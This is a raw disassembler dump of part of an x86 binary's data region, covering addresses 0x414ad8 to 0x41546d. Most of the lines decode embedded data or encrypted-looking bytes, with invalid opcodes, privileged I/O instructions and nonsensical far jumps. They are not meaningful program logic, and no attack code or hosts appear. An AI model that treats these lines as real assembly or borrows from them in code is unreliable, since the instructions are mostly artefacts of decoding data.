  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    esp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [edi+ecx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fcomp  DWORD PTR [edi]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	(bad)  [edi-0x732ad6a4]
  414e45:	in     eax,0x0
  414e47:	add    dh,dh
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    dh,ch
  414e4d:	jne    0x414e85
  414e4f:	clc    
  414e50:	jo     0x414df7
  414e52:	int    0x5
  414e54:	mov    ebx,DWORD PTR [ebp+0x26873cd]
  414e5a:	cli    
  414e5b:	xchg   DWORD PTR [esi-0x43],edi
  414e5e:	outs   dx,DWORD PTR ds:[esi]
  414e5f:	mov    dh,0xaa
  414e61:	gs adc eax,0xa07d92ff
  414e67:	leave  
  414e68:	mov    edi,0x2df3a1ec
  414e6d:	ss jnp 0x414dfb
  414e70:	std    
  414e71:	lds    ebp,FWORD PTR [esi]
  414e73:	push   es
  414e74:	fbld   TBYTE PTR [ecx]
  414e76:	retf   
  414e77:	mov    ch,0x8b
  414e79:	mov    ds:0x8bf33306,al
  414e7e:	add    ecx,DWORD PTR [esi+0x21d299a1]
  414e84:	fsub   st,st(1)
  414e86:	mov    eax,0x71e4aca3
  414e8b:	or     eax,0x43c34e5a
  414e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e91:	inc    ebp
  414e92:	lods   al,BYTE PTR es:[esi]
  414e94:	mov    esi,0xb0c34475
  414e99:	adc    edx,DWORD PTR [edi-0x4e70ae50]
  414e9f:	int    0x58
  414ea1:	mov    ds:0xf34a5770,al
  414ea6:	pause  
  414ea8:	call   0xaa3f48fc
  414ead:	or     al,0xc5
  414eaf:	add    bl,BYTE PTR [ebp+0x138a49d1]
  414eb5:	retf   
  414eb6:	jge    0x414e56
  414eb8:	ffreep st(3)
  414eba:	nop
  414ebb:	(bad)  [eax-0x1de1c774]
  414ec1:	sahf   
  414ec2:	push   0x61
  414ec4:	mov    ah,0x37
  414ec6:	mov    eax,ds:0x2bb43703
  414ecb:	repz inc ebx
  414ecd:	mov    bl,0x2d
  414ecf:	enter  0x52ef,0x39
  414ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed4:	jecxz  0x414f18
  414ed6:	leave  
  414ed7:	mov    esp,0x36e00fc7
  414edc:	jmp    0xbf57:0x48f10816
  414ee3:	sbb    cl,BYTE PTR [ebx-0x59]
  414ee6:	sub    al,0x18
  414ee8:	mov    edx,0xd19fd816
  414eed:	lahf   
  414eee:	jmp    0x414ed8
  414ef0:	imul   ecx,DWORD PTR [ebp+0x59639e50],0xfffffff8
  414ef7:	push   edi
  414ef8:	mov    ah,0xb2
  414efa:	and    eax,0xc8ffd75c
  414eff:	cmc    
  414f00:	div    BYTE PTR [eax]
  414f02:	mov    cl,0x27
  414f04:	push   ecx
  414f05:	clc    
  414f06:	or     DWORD PTR [edi],ebp
  414f08:	out    dx,al
  414f09:	xor    DWORD PTR [edi+0x208a16e6],edx
  414f0f:	sub    ch,bl
  414f11:	push   ebx
  414f12:	pop    esp
  414f13:	mov    dl,0x62
  414f15:	adc    DWORD PTR [eax+0x22c5fb9f],esp
  414f1b:	les    esp,FWORD PTR [eax+0x11]
  414f1e:	inc    ecx
  414f1f:	mov    ds:0xe681b6c7,al
  414f24:	fst    st(5)
  414f26:	push   edx
  414f27:	and    ah,cl
  414f29:	in     al,dx
  414f2a:	adc    bh,BYTE PTR [esi-0x6e]
  414f2d:	and    al,0xd4
  414f2f:	mov    eax,0x9f4172f6
  414f34:	in     eax,0x19
  414f36:	jge    0x414eec
  414f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f39:	push   edi
  414f3a:	jb     0x414f3b
  414f3c:	ins    BYTE PTR es:[edi],dx
  414f3d:	push   ebp
  414f3e:	jmp    0x13f8e22
	...
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0xe40c
  414fc2:	lds    esi,FWORD PTR [edx+eax*4]
  414fc5:	out    0x0,al
  414fc7:	add    dh,dh
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [ecx],bl
  414fcd:	in     eax,0x5d
  414fcf:	mov    esi,0xc1db61d4
  414fd4:	cwde   
  414fd5:	and    ecx,DWORD PTR [edx]
  414fd7:	and    DWORD PTR [eax],0x94dcb2a2
  414fdd:	pop    edx
  414fde:	or     al,0x44
  414fe0:	jae    0x415061
  414fe2:	add    eax,0x2d63760c
  414fe7:	mov    bh,0x63
  414fe9:	shl    BYTE PTR [ecx-0x76786a23],1
  414fef:	xchg   DWORD PTR [ebx+0x182f18a0],esi
  414ff5:	dec    ecx
  414ff6:	lahf   
  414ff7:	(bad)  
  414ff8:	jno    0x414f87
  414ffa:	jo     0x415022
  414ffc:	ins    BYTE PTR es:[edi],dx
  414ffd:	cmp    al,0xf8
  414fff:	std    
  415000:	test   al,0xd1
  415002:	(bad)  
  415004:	int    0xf8
  415006:	bound  esi,QWORD PTR [ecx+0x55b2d5d]
  41500c:	nop
  41500d:	cld    
  41500e:	jp     0x414ff2
  415010:	outs   dx,DWORD PTR ds:[esi]
  415011:	outs   dx,BYTE PTR ds:[esi]
  415012:	xor    BYTE PTR [eax],dh
  415014:	jle    0x415068
  415016:	aam    0xcd
  415018:	scas   al,BYTE PTR es:[edi]
  415019:	js     0x415080
  41501b:	cwde   
  41501c:	movd   ebp,mm4
  41501f:	pusha  
  415020:	adc    esi,eax
  415022:	stc    
  415023:	lods   al,BYTE PTR ds:[esi]
  415024:	and    BYTE PTR [ebx+0x17],al
  415027:	lahf   
  415028:	and    DWORD PTR [ecx],esp
  41502a:	shr    DWORD PTR [eax-0x4c9cb334],0xd0
  415031:	in     eax,0x9b
  415033:	or     DWORD PTR [ecx-0xc],ebx
  415036:	js     0x415037
  415038:	inc    esp
  415039:	cs std 
  41503b:	push   eax
  41503c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41503d:	inc    edi
  41503e:	push   esi
  41503f:	cld    
  415040:	dec    eax
  415041:	add    eax,DWORD PTR [eax+0x59]
  415044:	call   0x1c2b1ae1
  415049:	ret    
  41504a:	mov    ecx,0x8896538e
  41504f:	cmc    
  415050:	xor    esp,DWORD PTR [ebx+ebx*2]
  415053:	pop    esi
  415054:	dec    ebp
  415055:	mov    dh,BYTE PTR [edi]
  415057:	out    0x1f,al
  415059:	mov    ds:0xe23d78b6,al
  41505e:	and    BYTE PTR [ebp-0x4fb8fd71],dh
  415064:	and    BYTE PTR [eax+0x39],bl
  415067:	mov    BYTE PTR [eax],al
  415069:	cmp    al,0x18
  41506b:	sub    ch,0xe1
  41506e:	cmp    eax,0xd7554cc5
  415073:	jl     0x415004
  415075:	adc    ch,bh
  415077:	pop    eax
  415078:	pop    es
  415079:	daa    
  41507a:	cmp    al,BYTE PTR [edx-0x545a5791]
  415080:	push   esp
  415081:	jle    0x415083
  415083:	pop    edx
  415084:	loop   0x41507e
  415086:	sar    ebx,1
  415088:	pop    es
  415089:	iret   
  41508a:	cmp    eax,0xe4ff0591
  41508f:	hlt    
  415090:	mov    ds:0xe6a375cb,eax
  415095:	sbb    BYTE PTR [ecx-0xe2b31cf],ch
  41509b:	mov    BYTE PTR [ecx-0x55],ch
  41509e:	dec    ebx
  41509f:	sbb    eax,DWORD PTR [eax+0x2005491]
  4150a5:	mov    al,ds:0x355a43a7
  4150aa:	push   ds
  4150ab:	cmp    edi,DWORD PTR [edi+0x3cdcd2da]
  4150b1:	and    esp,DWORD PTR [ebp-0x59067ead]
  4150b7:	scas   al,BYTE PTR es:[edi]
  4150b8:	(bad)  
  4150b9:	rcl    BYTE PTR [eax-0x46177c0b],cl
  4150bf:	pop    ebx
  4150c0:	dec    dl
	...
  415132:	add    BYTE PTR [eax],al
  415134:	add    dl,BYTE PTR [edx]
  415136:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41513c:	adc    ah,BYTE PTR [esi-0x1ec13b27]
  415142:	pop    es
  415143:	(bad)  
  415144:	js     0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	test   BYTE PTR [eax],0x0
  41514b:	add    ah,bh
  41514d:	cs pop ebx
  41514f:	mov    ds:0xa5a5d119,eax
  415154:	jno    0x415129
  415156:	scas   eax,DWORD PTR es:[edi]
  415157:	xchg   ebp,eax
  415158:	sbb    eax,0xac10dd9
  41515d:	mov    ebx,0x60456055
  415162:	push   ss
  415163:	enter  0x68b4,0x54
  415167:	sbb    bh,BYTE PTR [edi]
  415169:	jp     0x41517a
  41516b:	inc    esi
  41516c:	mov    ds:0x52934852,al
  415171:	or     eax,0x9c460543
  415176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415177:	and    esi,DWORD PTR [ebp+0x4]
  41517a:	xor    DWORD PTR [eax-0x74],0xffffff8a
  41517e:	pop    ebp
  41517f:	pop    edx
  415180:	push   DWORD PTR [ebp+0x6f5637ab]
  415186:	push   ebx
  415187:	sbb    BYTE PTR [eax+0x1e],ah
  41518a:	cld    
  41518b:	repz cmp al,0x66
  41518e:	sub    al,0xc3
  415190:	lods   al,BYTE PTR ds:[esi]
  415191:	int3   
  415192:	pushf  
  415193:	mov    eax,0x31dee9f0
  415198:	mov    ch,0x81
  41519a:	push   ecx
  41519b:	add    eax,0x847c1b3b
  4151a0:	jno    0x41521d
  4151a2:	mov    ebp,0x35a78068
  4151a7:	adc    DWORD PTR [edx],ebp
  4151a9:	cmp    eax,0x20239b1b
  4151ae:	or     DWORD PTR [ecx-0x64b020c4],0x22
  4151b5:	xor    bl,BYTE PTR [edi+eiz*1]
  4151b8:	pop    ebx
  4151b9:	xor    DWORD PTR [eax+edi*2-0x33],ebp
  4151bd:	push   0xfffffff3
  4151bf:	pop    ebx
  4151c0:	mov    al,ds:0xf8268526
  4151c5:	popf   
  4151c6:	sbb    BYTE PTR [ecx+eax*1+0x17f4872d],al
  4151cd:	mov    esp,0x962b8f08
  4151d2:	cs (bad) 
  4151d5:	into   
  4151d6:	pop    eax
  4151d7:	int    0x7f
  4151d9:	lods   eax,DWORD PTR ds:[esi]
  4151da:	in     al,dx
  4151db:	sub    DWORD PTR [ecx+eiz*4+0x35cc7702],ebp
  4151e2:	pop    esp
  4151e3:	mov    al,0x3b
  4151e5:	in     eax,dx
  4151e6:	(bad)  
  4151e7:	and    al,0x92
  4151e9:	pushf  
  4151ea:	imul   DWORD PTR ds:0x64a2476a
  4151f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151f1:	mov    eax,ds:0x1fa8db25
  4151f6:	iret   
  4151f7:	sbb    al,0xc5
  4151f9:	scas   eax,DWORD PTR es:[edi]
  4151fa:	add    DWORD PTR [esi+0x185b32b7],esp
  415200:	lods   eax,DWORD PTR ds:[esi]
  415201:	push   ebp
  415202:	lods   eax,DWORD PTR ds:[esi]
  415203:	push   ebp
  415204:	xor    al,0xe2
  415206:	pushf  
  415207:	add    eax,0x6f7a034e
  41520c:	sahf   
  41520d:	adc    ebx,0x31803b13
  415213:	popf   
  415214:	nop
  415215:	and    DWORD PTR ds:[edx+0x6e],ebx
  415219:	dec    ebx
  41521a:	bound  eax,QWORD PTR [esi]
  41521c:	loope  0x4151df
  41521e:	push   esi
  41521f:	xor    DWORD PTR [ebx-0x5b833aec],ebx
  415225:	outs   dx,DWORD PTR ds:[esi]
  415226:	ins    DWORD PTR es:[edi],dx
  415227:	std    
  415228:	pop    edx
  415229:	push   edi
  41522a:	xor    DWORD PTR [edi+0x1e301caa],0xdc5f09d1
  415234:	dec    edi
  415235:	lods   al,BYTE PTR ds:[esi]
  415236:	daa    
  415237:	dec    edx
  415238:	xchg   edx,eax
  415239:	push   ds
  41523a:	pop    edi
  41523b:	inc    eax
  41523c:	pop    edi
  41523d:	sub    al,0x3
  415240:	or     eax,0xb1
	...
  4152b1:	add    BYTE PTR [eax],al
  4152b3:	add    BYTE PTR [ecx],al
  4152b5:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	loope  0x41524c
  4152c2:	inc    edx
  4152c3:	aam    0x6e
  4152c5:	call   0x13752ca
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	fnstsw WORD PTR [edx+0x53]
  4152cf:	fwait
  4152d0:	pop    ecx
  4152d1:	sbb    edx,DWORD PTR [ecx+eax*1]
  4152d4:	pusha  
  4152d5:	adc    ebx,esp
  4152d7:	shl    BYTE PTR [edi+ebx*8+0x50682826],1
  4152de:	cmp    BYTE PTR [ebx+0x20],0x6a
  4152e2:	add    DWORD PTR [ebx],edx
  4152e4:	ins    DWORD PTR es:[edi],dx
  4152e5:	add    edi,DWORD PTR [esp+eax*1]
  4152e8:	das    
  4152e9:	dec    ebp
  4152ea:	lods   eax,DWORD PTR ds:[esi]
  4152eb:	and    DWORD PTR [edx-0x6f],ebp
  4152ee:	rcr    cl,0xc2
  4152f1:	mov    al,ds:0xfa92a0f
  4152f6:	scas   eax,DWORD PTR es:[edi]
  4152f7:	push   es
  4152f8:	repz pop esi
  4152fa:	sbb    dh,BYTE PTR [ebp-0x126e0977]
  415300:	(bad)  
  415301:	scas   al,BYTE PTR es:[edi]
  415302:	mov    ch,0xf8
  415304:	addr16 inc ebx
  415306:	mov    dl,cl
  415308:	jo     0x415366
  41530a:	mov    esi,0x8843fb93
  41530f:	mov    bh,0x68
  415311:	test   eax,0xdf114f82
  415316:	jg     0x415342
  415318:	and    DWORD PTR [esi+0x2abf7c47],ebx
  41531e:	(bad)  
  415320:	or     eax,0xa65ad45e
  415325:	mov    eax,0x40df903e
  41532a:	mov    ebx,0x3068eb54
  41532f:	lea    edx,[ebx+0xc]
  415332:	push   0x48005bd6
  415337:	jmp    0x4152bf
  415339:	in     eax,0x87
  41533b:	sub    BYTE PTR [esp+eiz*4],0x17
  41533f:	mov    ebx,DWORD PTR [ebp+0x29]
  415342:	loopne 0x415378
  415344:	mov    ah,0xee
  415346:	shl    ch,1
  415348:	addr16 imul ebx,eax,0x1c04b302
  41534f:	add    esi,DWORD PTR [edx]
  415351:	cmp    eax,0xff36c2c8
  415356:	je     0x415361
  415358:	jne    0x41535c
  41535a:	icebp  
  41535b:	scas   al,BYTE PTR es:[edi]
  41535c:	jo     0x415369
  41535e:	pop    esi
  41535f:	inc    esi
  415360:	loopne 0x4152e6
  415362:	vsubpd ymm0,ymm0,YMMWORD PTR [esi+0x14]
  415367:	cwde   
  415368:	setle  al
  41536b:	dec    ebp
  41536c:	jge    0x415385
  41536e:	je     0x41539a
  415370:	call   ebx
  415372:	pop    eax
  415373:	mov    ebx,0x5712d5e9
  415378:	daa    
  415379:	imul   ebx,DWORD PTR [ecx+0x5b64643f],0x16084132
  415383:	jmp    0xd660:0xed5e67e5
  41538a:	xchg   BYTE PTR [ebx+0x22],bl
  41538d:	mov    edx,0x12ac8a4d
  415392:	and    al,BYTE PTR [ebx+0x68656719]
  415398:	mov    cl,0x1
  41539a:	push   cs
  41539b:	mov    WORD PTR [ecx+ebx*8-0x2a],fs
  41539f:	pop    ss
  4153a0:	and    ch,bl
  4153a2:	sbb    DWORD PTR [ebx-0x37],edi
  4153a5:	int3   
  4153a6:	je     0x415375
  4153a8:	sbb    BYTE PTR es:[esi],dl
  4153ab:	pop    edx
  4153ac:	stos   DWORD PTR es:[edi],eax
  4153ad:	mov    bl,0x52
  4153af:	xchg   ecx,eax
  4153b0:	inc    esi
  4153b1:	inc    ebx
  4153b2:	push   esp
  4153b3:	scas   al,BYTE PTR es:[edi]
  4153b4:	enter  0xa64,0xda
  4153b8:	pop    ecx
  4153b9:	dec    ebp
  4153ba:	addr16 cmp al,0x48
  4153bd:	add    eax,0xc05bea
	...
  415432:	add    BYTE PTR [eax],al
  415434:	pop    ebx
  415435:	jae    0x415479
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	mov    ecx,0x64fc5a03
  415445:	jmp    0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	fnsave [ebx-0x434293e8]
  415452:	out    dx,eax
  415453:	cld    
  415454:	jns    0x4153d7
  415456:	adc    eax,0x781832e6
  41545b:	leave  
  41545c:	sar    DWORD PTR [ebp-0x4f01a3f7],cl
  415462:	push   edi
  415463:	mov    ds,esi
  415465:	dec    edx
  415466:	arpl   WORD PTR [ecx+0x34],di
  415469:	idiv   DWORD PTR [esi-0x6b]
  41546c:	iret   
  41546d:	out    0x2a,al
